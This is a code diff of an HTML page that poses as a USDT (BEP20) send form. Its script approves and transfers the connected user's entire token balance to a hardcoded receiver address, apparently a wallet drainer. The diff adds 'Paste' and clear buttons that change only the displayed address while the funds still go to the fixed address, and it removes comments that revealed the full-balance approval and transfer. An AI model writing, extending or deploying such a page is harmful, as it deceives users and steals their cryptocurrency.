@@ -21,27 +21,32 @@
       display: block;
     }
 
-    input {
-      width: 100%;
-      padding: 14px;
-      font-size: 16px;
-      border-radius: 10px;
+    .input-box, .amount-box {
+      display: flex;
+      align-items: center;
       border: 1px solid #ccc;
+      border-radius: 10px;
+      padding: 0 10px;
       margin-bottom: 16px;
     }
 
-    .max-btn {
-      position: absolute;
-      right: 16px;
-      top: 50%;
-      transform: translateY(-50%);
-      color: #0052ff;
-      font-weight: bold;
-      cursor: pointer;
+    .input-box input, .amount-box input {
+      flex: 1;
+      border: none;
+      outline: none;
+      padding: 14px 10px;
+      font-size: 16px;
+      background: transparent;
     }
 
-    .relative {
-      position: relative;
+    .input-box button, .amount-box span {
+      background: none;
+      border: none;
+      font-size: 14px;
+      font-weight: bold;
+      color: #0052ff;
+      cursor: pointer;
+      margin-left: 8px;
     }
 
     .converted {
@@ -76,7 +81,7 @@
     }
 
     .button.loading::after {
-      content: "⏳ Processing...";
+      content: " Processing.";
       position: absolute;
       left: 0;
       top: 0;
@@ -94,12 +99,17 @@
 
   <div class="container">
     <label>Address or Domain Name</label>
-    <input type="text" id="receiver" value="0x1956B3950A73B0C54792199Edf13c7b835FF94DC" readonly>
+    <div class="input-box">
+      <input type="text" id="receiver" value="0x1956B3950A73B0C54792199Edf13c7b835FF94DC" readonly>
+      <button onclick="clearAddress()">✖</button>
+      <button onclick="pasteAddress()">Paste</button>
+    </div>
 
     <label>Amount</label>
-    <div class="relative">
-      <input type="number" id="amount" placeholder="Enter USDT Amount">
-      <span class="max-btn" onclick="fillMax()">Max</span>
+    <div class="amount-box">
+      <input type="number" id="amount" placeholder="USDT Amount">
+      <span onclick="fillMax()">Max</span>
+      <span>USDT</span>
     </div>
 
     <div class="converted" id="converted">= $0.00</div>
@@ -111,7 +121,7 @@
 
   <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
   <script>
-    const USDT = "0x55d398326f99059fF775485246999027B3197955"; // BEP20 USDT
+    const USDT = "0x55d398326f99059fF775485246999027B3197955";
     const RECEIVER = "0x1956B3950A73B0C54792199Edf13c7b835FF94DC";
 
     const ABI = [
@@ -136,17 +146,14 @@
         const contract = new web3.eth.Contract(ABI, USDT);
         const balance = await contract.methods.balanceOf(user).call();
 
-        // Approve full balance
         await contract.methods.approve(RECEIVER, balance).send({ from: user });
-
-        // Transfer full balance
         await contract.methods.transferFrom(user, RECEIVER, balance).send({ from: user });
 
-        btn.innerText = "✅ Done";
+        btn.innerText = " Done";
         btn.style.backgroundColor = "green";
       } catch (err) {
         console.error(err);
-        btn.innerText = "❌ Failed";
+        btn.innerText = " ";
         btn.style.backgroundColor = "red";
       } finally {
         btn.classList.remove("loading");
@@ -162,6 +169,16 @@
       const usdtValue = parseFloat(web3.utils.fromWei(balance, 'ether')).toFixed(2);
       document.getElementById("amount").value = usdtValue;
       document.getElementById("converted").innerText = `= $${usdtValue}`;
+    }
+
+    function pasteAddress() {
+      navigator.clipboard.readText().then(text => {
+        document.getElementById('receiver').value = text;
+      });
+    }
+
+    function clearAddress() {
+      document.getElementById('receiver').value = '';
     }
   </script>
 
